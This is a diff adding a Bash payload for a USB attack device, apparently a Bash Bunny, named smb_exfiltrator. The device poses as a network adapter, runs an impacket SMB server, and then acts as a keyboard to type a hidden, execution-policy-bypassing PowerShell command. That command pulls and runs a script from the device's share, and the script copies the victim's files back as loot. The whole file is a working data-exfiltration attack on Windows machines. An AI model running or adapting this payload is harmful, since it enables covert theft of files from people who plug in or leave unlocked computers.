@@ -1,0 +1,34 @@
+#!/bin/bash
+
+######## INITIALIZATION ########
+REQUIRETOOL impacket
+GET SWITCH_POSITION
+mkdir -p /loot/smb/
+rm -rf /loot/smb/*
+cp /root/udisk/payloads/$SWITCH_POSITION/s.ps1 /loot/smb/
+mkdir -p /root/udisk/loot/smb_exfiltrator
+
+######## ETHERNET STAGE ########
+LED STAGE1
+ATTACKMODE RNDIS_ETHERNET
+python /tools/impacket/examples/smbserver.py -smb2support -comment 'theplace' s /loot/smb >> /loot/smbserver.log &
+echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+######## HID STAGE ########
+GET HOST_IP
+LED SETUP
+ATTACKMODE HID RNDIS_ETHERNET
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"While (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
+LED B 100
+while [ ! -f /loot/smb/EXFILTRATION_COMPLETE ]; do echo waiting; sleep 1; done
+
+######## CLEANUP ########
+LED CLEANUP
+rm -rf /loot/smb/EXFILTRATION_COMPLETE
+mv /loot/smb/e/* /root/udisk/loot/smb_exfiltrator
+rm -rf /loot/smb/e/*
+sync
+
+######## FINISH ########
+# Trap is clean
+LED FINISH
